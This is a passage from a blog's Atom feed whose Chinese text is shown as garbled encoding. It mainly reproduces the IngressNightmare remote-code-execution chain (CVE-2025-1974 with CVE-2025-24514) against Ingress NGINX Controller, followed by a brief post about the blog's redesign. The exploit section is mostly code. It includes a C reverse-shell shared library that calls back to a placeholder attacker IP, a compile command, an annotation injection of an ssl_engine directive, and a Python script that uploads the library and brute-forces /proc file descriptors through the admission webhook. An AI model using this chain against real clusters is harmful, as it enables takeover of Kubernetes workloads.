class="code"><pre><span class="line">I0326 02:53:15.823881       7 main.go:107] &quot;successfully validated configuration, accepting&quot; ingress=&quot;/&quot;</span><br></pre></td></tr></table></figure><p>è¿›è¡Œæ·±ä¸€æ­¥åˆ©ç”¨éœ€æ­é…IngressNightmareçš„å…¶ä½™æ¼æ´ï¼Œæ”»å‡»åˆ†ä¸‰æ­¥å®ç°RCEï¼šä¸Šä¼ æ¶æ„.soæ–‡ä»¶è‡³Podä¸´æ—¶å­˜å‚¨ï¼›é€šè¿‡Content-Lengthæ ‡å¤´ç»´æŒæ–‡ä»¶æè¿°ç¬¦ï¼›æ³¨å…¥ssl_engineæŒ‡ä»¤åŠ è½½æ¶æ„åº“ã€‚</p><h3 id="è¿›ä¸€æ­¥åˆ©ç”¨"><a href="#è¿›ä¸€æ­¥åˆ©ç”¨" class="headerlink" title="è¿›ä¸€æ­¥åˆ©ç”¨"></a>è¿›ä¸€æ­¥åˆ©ç”¨</h3><p>é€šè¿‡ CVE-2025-24514 + CVE-2025-1974 å®ç°RCE</p><p>å½“æˆ‘ä»¬åœ¨auth-url annotationå¤„é…ç½®å¦‚ä¸‹æ—¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx.ingress.kubernetes.io/auth-url: &quot;http://example.com/#;\ninjection_point&quot; </span><br></pre></td></tr></table></figure><p>ç”±äºæ³¨é‡Šç¬¦çš„åŸå› ï¼Œ\nä¼šè¢«è§£æä¸ºå›è½¦ï¼Œäºæ˜¯é…ç½®æ–‡ä»¶ä¸­ä¼šæ˜¾ç¤ºä¸ºå¦‚ä¸‹æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">... </span><br><span class="line">proxy_http_version 1.1; </span><br><span class="line">set $target http://example.com/#; </span><br><span class="line">injection_point </span><br><span class="line">proxy_pass $target; </span><br><span class="line">... </span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬å°†ä¸Šé¢çš„injection_pointæ›¿æ¢ä¸º<code>ssl_engine</code>æŒ‡ä»¤ï¼Œå³å¯åœ¨æµ‹è¯•é…ç½®æ–‡ä»¶æ—¶åŠ è½½æ¶æ„åº“<br>ç¼–å†™æ¶æ„åº“æ–‡ä»¶ï¼Œç”¨äºåå¼¹shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">static</span> <span class="type">void</span> <span class="title function_">reverse_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *server_ip=<span class="string">&quot;xx.xx.xx.xx&quot;</span>;</span><br><span class="line">    <span class="type">uint32_t</span> server_port=<span class="number">6666</span>;</span><br><span class="line">    <span class="type">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    attacker_addr.sin_family = AF_INET;</span><br><span class="line">    attacker_addr.sin_port = htons(server_port);</span><br><span class="line">    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);</span><br><span class="line">    <span class="keyword">if</span>(connect(sock, (<span class="keyword">struct</span> sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    dup2(sock, <span class="number">0</span>);</span><br><span class="line">    dup2(sock, <span class="number">1</span>);</span><br><span class="line">    dup2(sock, <span class="number">2</span>);</span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›è¡Œç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC shell.c -o shell.so</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨nginxçš„å®¢æˆ·ç«¯ç¼“å†²æœºåˆ¶æš‚å­˜shellæ–‡ä»¶ï¼Œå¹¶ä¸”éå†è¿›ç¨‹pidå’Œfdè§¦å‘åŠ è½½</p><p>expå¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># æ­¤å¤„æ³¨æ„ï¼Œç”±äºæ˜¯æœ¬åœ°éªŒè¯ æˆ‘æ‰§è¡Œäº†ä»¥ä¸‹ä¸¤æ¡å‘½ä»¤è¿›è¡Œç«¯å£è½¬å‘</span><br><span class="line">#kubectl port-forward -n ingress-nginx svc/ingress-nginx-controller-admission 2333:8443 &amp;</span><br><span class="line">#kubectl port-forward -n ingress-nginx svc/ingress-nginx-controller 2888:80 &amp;</span><br><span class="line"></span><br><span class="line">admission_url = &#x27;https://localhost:2333/123&#x27;</span><br><span class="line">url = &#x27;http://localhost:2888&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;apiVersion&quot;: &quot;admission.k8s.io/v1&quot;,</span><br><span class="line">  &quot;kind&quot;: &quot;AdmissionReview&quot;,</span><br><span class="line">  &quot;request&quot;: &#123;</span><br><span class="line">    &quot;kind&quot;: &#123;</span><br><span class="line">      &quot;group&quot;: &quot;networking.k8s.io&quot;,</span><br><span class="line">      &quot;version&quot;: &quot;v1&quot;,</span><br><span class="line">      &quot;kind&quot;: &quot;Ingress&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;resource&quot;: &#123;</span><br><span class="line">      &quot;group&quot;: &quot;&quot;,</span><br><span class="line">      &quot;version&quot;: &quot;v1&quot;,</span><br><span class="line">      &quot;resource&quot;: &quot;namespaces&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;operation&quot;: &quot;CREATE&quot;,</span><br><span class="line">    &quot;object&quot;: &#123;</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;deads&quot;,</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">            &quot;nginx.ingress.kubernetes.io/auth-url&quot;: &quot;injection&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;spec&quot;: &#123;</span><br><span class="line">        &quot;rules&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;host&quot;: &quot;jacobsandum.com&quot;,</span><br><span class="line">            &quot;http&quot;: &#123;</span><br><span class="line">            &quot;paths&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                &quot;path&quot;: &quot;/&quot;,</span><br><span class="line">                &quot;pathType&quot;: &quot;Prefix&quot;,</span><br><span class="line">                &quot;backend&quot;: &#123;</span><br><span class="line">                    &quot;service&quot;: &#123;</span><br><span class="line">                    &quot;name&quot;: &quot;kubernetes&quot;,</span><br><span class="line">                    &quot;port&quot;: &#123;</span><br><span class="line">                        &quot;number&quot;: 80</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;ingressClassName&quot;: &quot;nginx&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">with open(&quot;poc.json&quot;, &quot;r&quot;) as f:</span><br><span class="line">    data = json.load(f)</span><br><span class="line"></span><br><span class="line">with open(&quot;shell.so&quot;, &quot;rb&quot;) as f:</span><br><span class="line">    shellcode = f.read()</span><br><span class="line"></span><br><span class="line">def upload():</span><br><span class="line">    real_lenth = len(shellcode)</span><br><span class="line">    fake_lenth = real_lenth + 20</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            &quot;Content-length&quot;: str(fake_lenth),</span><br><span class="line">            &quot;Content-Type&quot;: &quot;application/octet-stream&quot;,</span><br><span class="line">            &quot;Connection&quot;: &quot;keep-alive&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, headers=headers,data= shellcode)</span><br><span class="line">        print(&quot;[+]upload success&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;[!]upload failed\n&quot;)</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def testing_to_load():</span><br><span class="line">    for pid in range(0,41):</span><br><span class="line">        for fd in range(0,41):</span><br><span class="line">            path_test = f&#x27;/proc/&#123;pid&#125;/fd/&#123;fd&#125;&#x27;</span><br><span class="line">            data[&quot;request&quot;][&quot;object&quot;][&quot;metadata&quot;][&quot;annotations&quot;][</span><br><span class="line">                &quot;nginx.ingress.kubernetes.io /&quot;</span><br><span class="line">            ] = &quot;http://example.com/#;&#125;&#125;&#125;\\n\\nssl_engine %s;\\n\\n&quot; % (path_test,)</span><br><span class="line"></span><br><span class="line">            try:</span><br><span class="line">                res = requests.post(admission_url, json=data, verify=False)</span><br><span class="line">                print(&quot;[+]testing&quot; + &quot; &quot; + path_test)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                print(&quot;[!]&quot; + &quot; error parsing response&quot;)</span><br><span class="line">                print(e)</span><br><span class="line"></span><br><span class="line">upload()</span><br><span class="line">testing_to_load()</span><br></pre></td></tr></table></figure><h3 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h3><p>Ingress NGINX Controller ç‰ˆæœ¬&lt; 1.12.1</p><p>Ingress NGINX Controller ç‰ˆæœ¬&lt; 1.11.5</p><p>Ingress NGINX Controller ç‰ˆæœ¬&lt; 1.10.7</p><h3 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h3><p>è¿™äº›æ¼æ´å·²åœ¨ Ingress NGINX Controller çš„ 1.12.1ã€1.11.5 å’Œ 1.10.7 ç‰ˆæœ¬ä¸­å¾—åˆ°ä¿®å¤ã€‚å»ºè®®ç”¨æˆ·å°½å¿«æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œå¹¶ç¡®ä¿å‡†å…¥ Webhook ç«¯ç‚¹ä¸ä¼šå¯¹å¤–æš´éœ²</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CVE-2025-1974å¤ç°&quot;&gt;&lt;a href=&quot;#CVE-2025-1974å¤ç°&quot; class=&quot;headerlink&quot; title=&quot;CVE-2025-1974å¤ç°&quot;&gt;&lt;/a&gt;CVE-2025-1974å¤ç°&lt;/h2&gt;&lt;h3 id=&quot;æ¼æ´ç®€ä»‹&quot;&gt;&lt;a href</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HelloWorld</title>
    <link href="http://example.com/2025/01/01/java_sec/"/>
    <id>http://example.com/2025/01/01/java_sec/</id>
    <published>2025-01-01T13:50:45.859Z</published>
    <updated>2025-01-01T15:42:55.791Z</updated>
    
    <content type="html"><![CDATA[<p>2025å¹´1æœˆ1æ—¥æ”¹ç‰ˆåšå®¢ï¼Œå†³å®šå†™ä¸€äº›çœŸæ­£æœ‰æ€è€ƒçš„ä¸œè¥¿ï¼Œè‡³å°‘è¦è®©è‡ªå·±çœ‹çš„ä¸‹å»ã€‚<br>åšå®¢åŸºäºHexoæ­å»ºï¼Œä¸»é¢˜æ˜¯cactus,ä¸ªäººæ”¹ç‰ˆäº†ä¸€ä¸‹ï¼Œä¿®æ”¹äº†é¡µé¢å®½åº¦å’Œå­—ä½“å¤§å°ã€‚<br>hexoä¸»é¢˜çš„é€šç—…å°±æ˜¯é¡µé¢æœ‰ç‚¹çª„ï¼Œå­—ä½“æœ‰ç‚¹å°ï¼ˆä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘æ²¡è®¾ç½®å¥½ï¼‰ï¼Œå¯¹çœ¼ç›ä¸æ˜¯å¾ˆå‹å¥½ï¼Œæˆ‘å–œæ¬¢å¤§ä¸€ç‚¹çš„å­—ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2025å¹´1æœˆ1æ—¥æ”¹ç‰ˆåšå®¢ï¼Œå†³å®šå†™ä¸€äº›çœŸæ­£æœ‰æ€è€ƒçš„ä¸œè¥¿ï¼Œè‡³å°‘è¦è®©è‡ªå·±çœ‹çš„ä¸‹å»ã€‚&lt;br&gt;åšå®¢åŸºäºHexoæ­å»ºï¼Œä¸»é¢˜æ˜¯cactus,ä¸ªäººæ”¹ç‰ˆäº†ä¸€ä¸‹ï¼Œä¿®æ”¹äº†é¡µé¢å®½åº¦å’Œå­—ä½“å¤§å°ã€‚&lt;br&gt;hexoä¸»é¢˜çš„é€šç—…å°±æ˜¯é¡µé¢æœ‰ç‚¹çª„ï¼Œå­—ä½“æœ‰ç‚¹å°ï¼ˆä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘æ²¡è®¾ç½®å¥½ï¼‰ï¼Œå¯¹çœ¼ç›ä¸æ˜¯å¾ˆå‹å¥½ï¼Œæˆ‘å–œæ¬¢å¤§</summary>
      
    
    
    
    <category term="å¿ƒå¾—ä¸ä½“ä¼š" scheme="http://example.com/categories/%E5%BF%83%E5%BE%97%E4%B8%8E%E4%BD%93%E4%BC%9A/"/>
    
    
  </entry>
  
</feed>
